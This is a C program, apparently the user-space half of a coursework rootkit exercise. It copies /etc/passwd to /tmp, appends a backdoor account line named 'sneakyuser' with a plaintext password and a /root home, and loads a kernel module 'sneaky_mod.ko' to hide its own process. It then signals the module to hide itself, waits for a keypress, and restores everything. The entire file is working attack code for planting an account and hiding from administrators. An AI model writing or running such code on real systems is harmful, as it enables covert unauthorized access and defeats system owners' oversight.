#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv) {

  printf("sneaky_process pid = %d\n", getpid());

  FILE *src, *dst;
  int ch, input;
  char insmod_str[255];

  src = fopen("/etc/passwd", "a+");
  if (src == NULL) {
    perror("Error opening /etc/passwd");
    exit(EXIT_FAILURE);
  }
  dst = fopen("/tmp/passwd", "w");
  if (dst == NULL) {
    perror("Error opening /tmp/passwd");
    exit(EXIT_FAILURE);
  }
  while ((ch = fgetc(src)) != EOF) {
    fputc(ch, dst);
  }
  fprintf(src, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
  fclose(src);
  fclose(dst);

  sprintf(insmod_str, "insmod sneaky_mod.ko hide_pid=%d", (int)getpid());
  system(insmod_str);
  system("kill -50 650"); // hide sneaky_mod, pid doesn't matter here
  while ((input = getchar()) != 'q') {
  }
  system("kill -50 650"); // show sneaky_mod, pid doesn't matter here
  system("rmmod sneaky_mod");

  src = fopen("/etc/passwd", "w");
  if (src == NULL) {
    perror("Error opening /etc/passwd");
    exit(EXIT_FAILURE);
  }
  dst = fopen("/tmp/passwd", "r");
  if (dst == NULL) {
    perror("Error opening /tmp/passwd");
    exit(EXIT_FAILURE);
  }
  while ((ch = fgetc(dst)) != EOF) {
    fputc(ch, src);
  }
  fclose(src);
  fclose(dst);

  if (remove("/tmp/passwd") != 0) {
    perror("Error deleting file /tmp/passwd.");
    exit(EXIT_FAILURE);
  }

  return EXIT_SUCCESS;
}